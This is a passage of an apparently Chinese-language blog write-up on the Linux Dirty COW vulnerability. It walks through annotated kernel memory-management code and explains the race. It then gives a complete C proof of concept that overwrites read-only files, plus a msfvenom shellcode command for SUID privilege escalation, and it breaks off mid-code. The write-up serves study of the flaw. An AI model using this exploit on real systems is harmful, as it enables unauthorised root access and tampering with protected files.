class="hljs-comment">/*</span><br><span class="hljs-comment">应用表示不需要这些页，即使这些页是脏页，也直接丢弃，因此应用在丢弃前必须自己保存好数据</span><br><span class="hljs-comment">-zap_page_range()会设置shrink_active_list为实际要释放的页，如果一段时间后没有touch这些页，那么就会被释放*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">madvise_dontneed</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> vm_area_struct **prev,</span><br><span class="hljs-params">     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end)</span><br>&#123;<br>*prev = vma;<br>    <span class="hljs-comment">//这些页面无法丢弃</span><br><span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; (VM_LOCKED|VM_HUGETLB|VM_PFNMAP))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>zap_page_range(vma, start, end - start, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="zap-page-range"><a href="#zap-page-range" class="headerlink" title="zap_page_range()"></a>zap_page_range()</h4><p><code>zap_page_range()</code>会遍历给定范围内所有的<strong>VMA</strong>, 对每一个<strong>VMA</strong>调用<code>unmap_single_vma(...)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * zap_page_range - remove user pages in a given range</span><br><span class="hljs-comment"> * @vma: vm_area_struct holding the applicable pages</span><br><span class="hljs-comment"> * @start: starting address of pages to zap</span><br><span class="hljs-comment"> * @size: number of bytes to zap</span><br><span class="hljs-comment"> * @details: details of shared cache invalidation</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Caller must protect the VMA list</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">zap_page_range</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size, <span class="hljs-keyword">struct</span> zap_details *details)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mmu_gather</span> <span class="hljs-title">tlb</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end = start + size;<br><br>lru_add_drain();<br>tlb_gather_mmu(&amp;tlb, mm, start, end);<br>update_hiwater_rss(mm);<br>mmu_notifier_invalidate_range_start(mm, start, end);<br>    <span class="hljs-comment">//遍历从vma开始，到end结束的所有VMA</span><br><span class="hljs-keyword">for</span> ( ; vma &amp;&amp; vma-&gt;vm_start &lt; end; vma = vma-&gt;vm_next)<br>unmap_single_vma(&amp;tlb, vma, start, end, details);<br>mmu_notifier_invalidate_range_end(mm, start, end);<br>tlb_finish_mmu(&amp;tlb, start, end);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>后续会沿着<code>unmap_single_vma() =&gt; unmap_page_range() =&gt; zap_pud_range() =&gt; zap_pmd_range() =&gt; zap_pte_range()</code>的路径遍历各级页表项, 最后调用<code>zap_pte_range()</code>遍历每一个<strong>PTE</strong></p><h4 id="zap-pte-range"><a href="#zap-pte-range" class="headerlink" title="zap_pte_range()"></a>zap_pte_range()</h4><p><code>zap_pte_range()</code>会释放范围内所有的页</p><p>然后遍历范围内所有页, 清空页表中对应的<strong>PTE</strong>, 并减少对应页的引用计数, 当页的引用计数为0时会被内核回收</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//释放pte对应的页</span><br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">zap_pte_range</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mmu_gather *tlb,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zap_details *details)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> tlb-&gt;mm;<br><span class="hljs-type">int</span> force_flush = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> rss[NR_MM_COUNTERS];<br><span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-type">pte_t</span> *start_pte;<br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-type">swp_entry_t</span> entry;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">pending_page</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>again:<br>init_rss_vec(rss);<br>start_pte = pte_offset_map_lock(mm, pmd, addr, &amp;ptl);<br>pte = start_pte;<br>arch_enter_lazy_mmu_mode();<br>    <span class="hljs-comment">//遍历[addr, end)范围的每一个页</span><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-type">pte_t</span> ptent = *pte;<br><span class="hljs-keyword">if</span> (pte_none(ptent)) &#123;<span class="hljs-comment">//如果页描述范围为none则什么也不用做</span><br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (pte_present(ptent)) &#123;<span class="hljs-comment">//如果页存在</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br>page = vm_normal_page(vma, addr, ptent);<span class="hljs-comment">//根据addr找到对应页描述符</span><br><span class="hljs-keyword">if</span> (unlikely(details) &amp;&amp; page) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * unmap_shared_mapping_pages() wants to</span><br><span class="hljs-comment"> * invalidate cache without truncating:</span><br><span class="hljs-comment"> * unmap shared but keep private pages.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (details-&gt;check_mapping &amp;&amp;<br>    details-&gt;check_mapping != page_rmapping(page))<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>ptent = ptep_get_and_clear_full(mm, addr, pte,<br>tlb-&gt;fullmm);<span class="hljs-comment">//获取原来的PTE并清空页表中对应的PTE</span><br>tlb_remove_tlb_entry(tlb, pte, addr);<span class="hljs-comment">//清除TLB中对应条目</span><br><span class="hljs-keyword">if</span> (unlikely(!page))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (!PageAnon(page)) &#123;<span class="hljs-comment">//如果映射到文件，虽然不回写文件，但是需要调用文件地址空间相关回调函数</span><br><span class="hljs-keyword">if</span> (pte_dirty(ptent)) &#123;<span class="hljs-comment">//如果时脏页</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * oom_reaper cannot tear down dirty</span><br><span class="hljs-comment"> * pages</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(details &amp;&amp; details-&gt;ignore_dirty))<br><span class="hljs-keyword">continue</span>;<br>force_flush = <span class="hljs-number">1</span>;<br>set_page_dirty(page);<span class="hljs-comment">//调用文件对应地址空间中的:mapping-&gt;a_ops-&gt;set_page_dirty()方法</span><br>&#125;<br><span class="hljs-keyword">if</span> (pte_young(ptent) &amp;&amp;<br>    likely(!(vma-&gt;vm_flags &amp; VM_SEQ_READ)))<br>mark_page_accessed(page);<span class="hljs-comment">//标记下页面刚刚访问过</span><br>&#125;<br>            <span class="hljs-comment">//移出反向映射，并减少page的引用计数</span><br>rss[mm_counter(page)]--;<br>page_remove_rmap(page, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (unlikely(page_mapcount(page) &lt; <span class="hljs-number">0</span>))<br>print_bad_pte(vma, addr, ptent, page);<br><span class="hljs-keyword">if</span> (unlikely(__tlb_remove_page(tlb, page))) &#123;<span class="hljs-comment">//TLB中移出对应页</span><br>force_flush = <span class="hljs-number">1</span>;<br>pending_page = page;<br>addr += PAGE_SIZE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">continue</span>;<span class="hljs-comment">//处理下一个页</span><br>&#125;<br><span class="hljs-comment">/* only check swap_entries if explicitly asked for in details */</span><br><span class="hljs-keyword">if</span> (unlikely(details &amp;&amp; !details-&gt;check_swap_entries))<br><span class="hljs-keyword">continue</span>;<br><br>entry = pte_to_swp_entry(ptent);<br><span class="hljs-keyword">if</span> (!non_swap_entry(entry))<br>rss[MM_SWAPENTS]--;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_migration_entry(entry)) &#123;<br><span class="hljs-keyword">struct</span> page *page;<br><br>page = migration_entry_to_page(entry);<br>rss[mm_counter(page)]--;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!free_swap_and_cache(entry)))<br>print_bad_pte(vma, addr, ptent, <span class="hljs-literal">NULL</span>);<br>pte_clear_not_present_full(mm, addr, pte, tlb-&gt;fullmm);<br>&#125; <span class="hljs-keyword">while</span> (pte++, addr += PAGE_SIZE, addr != end);<br><br>add_mm_rss_vec(mm, rss);<br>arch_leave_lazy_mmu_mode();<br><br><span class="hljs-comment">/* Do the actual TLB flush before dropping ptl */</span><br><span class="hljs-keyword">if</span> (force_flush)<br>tlb_flush_mmu_tlbonly(tlb);<br>pte_unmap_unlock(start_pte, ptl);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we forced a TLB flush (either due to running out of</span><br><span class="hljs-comment"> * batch buffers or because we needed to flush dirty TLB</span><br><span class="hljs-comment"> * entries before releasing the ptl), free the batched</span><br><span class="hljs-comment"> * memory too. Restart if we didn&#x27;t do everything.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (force_flush) &#123;<br>force_flush = <span class="hljs-number">0</span>;<br>tlb_flush_mmu_free(tlb);<br><span class="hljs-keyword">if</span> (pending_page) &#123;<br><span class="hljs-comment">/* remove the page with new size */</span><br>__tlb_remove_pte_page(tlb, pending_page);<br>pending_page = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (addr != end)<br><span class="hljs-keyword">goto</span> again;<br>&#125;<br><br><span class="hljs-keyword">return</span> addr;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x03：漏洞分析"><a href="#0x03：漏洞分析" class="headerlink" title="0x03：漏洞分析"></a>0x03：漏洞分析</h1><p><del>牛魔的，终于到这了</del></p><p>让我们来回顾一下整个流程</p><ul><li>step Ⅰ：<code>__get_user_pages()</code>第一次循环，<code>faultin_page()</code>判断属于写入只读区域的情况, 因此会调用<code>do_cow_fault()</code>。<code>do_cow_fault()</code>会复制原始的文件缓存页到一个新页中, 并设置<strong>PTE</strong>映射到这个新页, 但由于<strong>VMA</strong>不可写入, 因此这个新页的<strong>PTE</strong>页没有设置<strong>RW</strong>标志</li><li>step Ⅱ：<code>__get_user_pages()</code>第二次循环，由于<code>foll_flags</code>中有<strong>FOLL_WRITE</strong>标志, 但是页对应的<strong>PTE</strong>没有<strong>RW</strong>标志, 因此<code>follow_page_mask()</code>判断权限有问题,。再次进入<code>faultin_page()</code>，<code>faultin_page()</code>判断, 属于写入只读的已存在的页造成的问题, 因此会调用<code>do_wp_page()</code>处理。<code>do_wp_page()</code>发现对应页是只有一个引用的匿名页,因此会调用<code>wp_page_reuse()</code>直接重用这个页。<code>wp_page_reuse()</code>由于对应<strong>VMA</strong>只读, 因此只会给<strong>PTE</strong>设置一个<strong>Dirty</strong>标志, 而不会设置<strong>RW</strong>标志, 然后返回一个<strong>VM_FAULT_WRITE</strong>表示内核可以写入这个页。返回到<code>faultin_page()</code>中, 由于<code>handle_mm_fault()</code>返回了<strong>VM_FAULT_WRITE</strong>, 因此会去掉<strong>FOLL_WRITE</strong>标志, 含义为: 虽然此页对应<strong>PTE</strong>不可写入, 但是已经<strong>COW</strong>过了, 内核是可以写入的, 后续<code>follow_page_mask()</code>就不要检查能不能写入了。</li></ul><p>此时，我们调用<code>madvise</code>，并建议内核执行其中<strong>DONTNEED</strong>的<code>behavior</code>，内核清空此<strong>PTE</strong>会发生什么捏？？🤔</p><p>首先<code>follow_page_mask()</code>会因为对应PTE为NULL而再次失败, 进入<code>faultin_page()</code>， 但是注意, 这次进入的时候没有<strong>FOLL_WRITE</strong>标志。<code>faultin_page()</code>因此设置<code>fault_flags</code>时是没有<strong>FAULT_FALG_WRITE</strong>标志的, 也就是说<code>faultin_page()</code>对<code>handle_mm_fault()</code>承诺不会写入这个页。<code>handle_mm_fault()</code>由于<strong>PTE</strong>为<strong>NONE</strong>, 并且不要求写入, 因此最终会分派给<code>do_read_fault()</code>处理</p><h3 id="do-read-fault"><a href="#do-read-fault" class="headerlink" title="do_read_fault()"></a>do_read_fault()</h3><p><code>do_read_fault()</code>会查找这片<strong>VMA</strong>映射的地址空间中, <code>address</code>对应的原始缓存页, 然后返回这个原始缓存页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_read_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>;</span><br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span><br><span class="hljs-comment"> * if page by the offset is not ready to be mapped (cold cache or</span><br><span class="hljs-comment"> * something).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="hljs-number">1</span>) &#123;<br>ret = do_fault_around(fe, pgoff);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>ret = __do_fault(fe, pgoff, <span class="hljs-literal">NULL</span>, &amp;fault_page, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">return</span> ret;<br><br>ret |= alloc_set_pte(fe, <span class="hljs-literal">NULL</span>, fault_page);<br><span class="hljs-keyword">if</span> (fe-&gt;pte)<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>unlock_page(fault_page);<br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>put_page(fault_page);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>虽然执行的时deo_read_fault，但此时的write flag可是true，于是在__access_remote_vm中会调用copy_to_user_page()把用户空间的数据写入固定的页，由此污染了文件的原始缓存页。</p><p>一段时间后，当进行磁盘同步时内核会把被污染的页面回写到磁盘中,修改只读文件的内容。</p><p>由此，利用完成。</p><h3 id="必要な問題"><a href="#必要な問題" class="headerlink" title="必要な問題"></a>必要な問題</h3><p>不难想到，开启两个线程便能在第二次<code>__get_user_pages</code>之后，第三次<code>__get_user_pages</code>之前完成madvise</p><p>但是时间窗口很重要，这意味着此利用的成功率以及实用价值</p><p>幸运的是在每次循环的开头，都会调用cond_resched()切换到别的任务，这个时间间隔完全可以满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br><span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>cond_resched();<span class="hljs-comment">//调度执行别的任务</span><br></code></pre></td></tr></table></figure><h1 id="0x04：利用-exp编写"><a href="#0x04：利用-exp编写" class="headerlink" title="0x04：利用 &amp; exp编写"></a>0x04：利用 &amp; exp编写</h1><h2 id="先来写一个验证poc"><a href="#先来写一个验证poc" class="headerlink" title="先来写一个验证poc"></a>先来写一个验证poc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>, <span class="hljs-title">fake_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">int</span> mem_fd, dest_fd, fake_fd;<br><span class="hljs-type">char</span> *fake_data;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>                                 <br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">()</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>        write(mem_fd, fake_data, <span class="hljs-number">0x1000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>        err_exit(<span class="hljs-string">&quot;pls usage ./exp destination_file fake_file&quot;</span>);<br>    <br><span class="hljs-comment">//open &amp; read fake file</span><br>    fake_fd = open(argv[<span class="hljs-number">2</span>], O_RDONLY);<br>    fstat(fake_fd, &amp;fake_st);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake_fd is %d\n&quot;</span>, fake_fd);<br>    fake_data = <span class="hljs-built_in">malloc</span>(fake_st.st_size);<br>    read(fake_fd, fake_data, fake_st.st_size);<br><br><span class="hljs-comment">//open dest file   </span><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>可以看到对于普通用户只有只读权限的文件，已经可以覆写了</p><p>那么接下来就能进行一些<del>嘿嘿嘿🥵🥵🥵</del>的事情了</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306105004.png"></p><h2 id="利用suid进行提权"><a href="#利用suid进行提权" class="headerlink" title="利用suid进行提权"></a>利用suid进行提权</h2><p>这个手法在渗透中也是很常见了，在此就不再赘述了</p><p>基本上就是利用dirtycow把具有suid的文件给越权篡改，写进提权的shellcode，再执行就好了</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><code>msf</code>生成<code>shellcode</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 